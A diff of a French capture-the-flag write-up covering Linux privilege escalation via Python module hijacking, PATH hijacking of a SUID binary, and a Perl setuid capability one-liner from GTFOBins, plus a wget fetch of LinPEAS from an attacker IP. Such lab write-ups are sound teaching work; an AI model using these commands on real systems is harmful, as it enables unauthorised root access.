@@ -37,42 +37,54 @@ import os
 os.system("/bin/bash")
 # /bin/bash : Starts a new bash shell session.
 ```
-Python charge les modules depuis le répertoire courant en priorité. Cette configuration permet un détournement de bibliothèque Python.
 
-Nous rendons ce fichier exécutable : `chmod +x random.py`. En exécutant le script principal en tant que rabbit, notre module `random.py` est chargé, nous donnant un shell en tant que rabbit.
+Nous rendons ce fichier exécutable : `chmod +x random.py`.
+
+En exécutant le script principal en tant que rabbit, notre module `random.py` est chargé à la place du module officiel, nous donnant un shell en tant que **rabbit**.
+
+---
 
 ## 🎩 3. Escalade de Privilèges : Rabbit vers Hatter
 *(Technique : SUID Binary & PATH Hijacking)*
 
-Dans le dossier `/home/rabbit`, nous découvrons un binaire nommé `teaParty`. C'est un fichier **SUID**, ce qui signifie qu'il s'exécute avec les permissions de son propriétaire (ici, `hatter`).
+Dans le dossier `/home/rabbit`, nous découvrons un binaire nommé `teaParty`.
+C'est un fichier **SUID**, ce qui signifie qu'il s'exécute avec les permissions de son propriétaire (ici, **hatter**).
 
-**Analyse du binaire :** Lors de l'exécution, le programme affiche un message et une date future.
+**Analyse du binaire :**
+Lors de l'exécution, le programme affiche un message et une date future.
+
+![TeaParty Execution](1er.webp)
 
 Pour comprendre son fonctionnement, nous analysons le binaire. Nous remarquons l'appel à la commande système `date` (et `/bin/echo`).
 
-**Vulnérabilité :** Le code utilise `/bin/echo` (chemin absolu, sécurisé) mais utilise simplement `date` (chemin relatif, vulnérable). Le système va donc chercher l'exécutable `date` dans les dossiers listés par la variable `$PATH`.
+![TeaParty Binary Analysis](2eme.webp)
+
+**Vulnérabilité :**
+Le code utilise `/bin/echo` (chemin absolu, sécurisé) mais utilise simplement `date` (chemin relatif, vulnérable). Le système va donc chercher l'exécutable `date` dans les dossiers listés par la variable `$PATH`.
 
 **Exploitation :**
-
-Nous créons un script malveillant nommé `date` qui lance un shell (`/bin/bash`).
-
-Nous modifions la variable `$PATH` pour inclure notre dossier actuel (`/home/rabbit`) au tout début.
+1.  Nous créons un script malveillant nommé `date` qui lance un shell (`/bin/bash`).
+2.  Nous modifions la variable `$PATH` pour inclure notre dossier actuel (`/home/rabbit`) au tout début.
 
 > **Note :** Nous ajoutons le PATH existant à la fin pour ne pas casser les fonctionnalités système de base, tout en priorisant notre binaire.
 
 ```bash
 export PATH=/home/rabbit:$PATH
 ```
-
+* `export` : Définit la variable d'environnement.
 * `/home/rabbit` : Le dossier où se trouve notre faux script "date".
 * `:$PATH` : Ajoute le chemin existant à la suite.
 
-En relançant `./teaParty`, le binaire exécute notre faux script `date` avec les droits de `hatter`. Nous obtenons un shell pour l'utilisateur `hatter`.
+![Export Path](3eme.webp)
+
+En relançant `./teaParty`, le binaire exécute notre faux script `date` avec les droits de hatter. Nous obtenons un shell pour l'utilisateur **hatter**.
+
+---
 
 ## 👑 4. Escalade de Privilèges : Hatter vers Root
 *(Technique : Linux Capabilities)*
 
-Une fois connecté en tant que `hatter`, nous transférons et exécutons **LinPEAS** pour scanner le système.
+Une fois connecté en tant que hatter, nous transférons et exécutons **LinPEAS** pour scanner le système.
 
 ```bash
 python3 -m http.server # Sur la machine attaquante
@@ -80,10 +92,15 @@ wget http://IP_ATTAQUANT:8000/linpeas.sh # Sur la victime
 chmod +x linpeas.sh
 ./linpeas.sh
 ```
-LinPEAS identifie que l'interpréteur `perl` possède des "capabilities" étendues (`cap_setuid+ep`).
+
+LinPEAS identifie que l'interpréteur **Perl** possède des "capabilities" étendues (`cap_setuid+ep`).
+
+![Linpeas Results](4eme.webp)
 
 ### Explication de la vulnérabilité
-La capability `CAP_SETUID` permet au binaire de manipuler son propre UID (User ID). Si elle est définie sur un binaire comme `perl`, elle peut être utilisée comme une backdoor pour devenir `root`.
+La capability `CAP_SETUID` permet au binaire de manipuler son propre UID (User ID). Si elle est définie sur un binaire comme Perl, elle peut être utilisée comme une backdoor pour devenir root.
+
+![Capabilities Explanation](5eme.webp)
 
 ### Exploitation
 Nous utilisons une commande issue de **GTFOBins** pour exploiter cette capability :
@@ -91,14 +108,18 @@ Nous utilisons une commande issue de **GTFOBins** pour exploiter cette capabilit
 ```bash
 perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
 ```
-perl -e : Exécute le script suivant.
 
-use POSIX qw(setuid); : Importe la fonction setuid.
+* `perl -e` : Exécute le script suivant.
+* `use POSIX qw(setuid);` : Importe la fonction setuid.
+* `POSIX::setuid(0);` : Définit l'ID utilisateur à 0 (Root).
+* `exec "/bin/sh";` : Lance un shell avec ces nouveaux privilèges.
 
-POSIX::setuid(0); : Définit l'ID utilisateur à 0 (Root).
+![Root Shell](6eme.webp)
 
-exec "/bin/sh"; : Lance un shell avec ces nouveaux privilèges.
+Nous sommes maintenant **root**. Pour rendre le shell plus agréable (autocomplétion, historique), nous le stabilisons :
 
-Nous sommes maintenant root. Pour rendre le shell plus agréable (autocomplétion, historique), nous le stabilisons :
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-Le flag final se trouve dans /root/user.txt.
+```
+
+Le flag final se trouve dans `/root/user.txt`.
